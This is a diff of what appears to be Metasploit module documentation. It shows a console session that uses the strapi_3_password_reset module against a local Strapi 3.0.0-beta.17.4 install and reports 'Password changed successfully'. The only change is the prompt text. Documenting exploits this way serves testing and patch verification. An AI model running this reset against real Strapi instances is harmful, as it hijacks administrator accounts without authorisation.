@@ -39,16 +39,16 @@ New Admin password. No default.
 ### npx install of strapi 3.0.0-beta.17.4
 
 ```
-msf6 > use auxiliary/scanner/http/strapi_3_password_reset
-msf6 auxiliary(scanner/http/strapi_3_password_reset) > set new_password testtesttest
+msf > use auxiliary/scanner/http/strapi_3_password_reset
+msf auxiliary(scanner/http/strapi_3_password_reset) > set new_password testtesttest
 new_password => testtesttest
-msf6 auxiliary(scanner/http/strapi_3_password_reset) > set rhosts 127.0.0.1
+msf auxiliary(scanner/http/strapi_3_password_reset) > set rhosts 127.0.0.1
 rhosts => 127.0.0.1
-msf6 auxiliary(scanner/http/strapi_3_password_reset) > set rport 1337
+msf auxiliary(scanner/http/strapi_3_password_reset) > set rport 1337
 rport => 1337
-msf6 auxiliary(scanner/http/strapi_3_password_reset) > check
+msf auxiliary(scanner/http/strapi_3_password_reset) > check
 [-] This module does not support check.
-msf6 auxiliary(scanner/http/strapi_3_password_reset) > run
+msf auxiliary(scanner/http/strapi_3_password_reset) > run
 
 [*] Resetting admin password...
 [+] Password changed successfully!
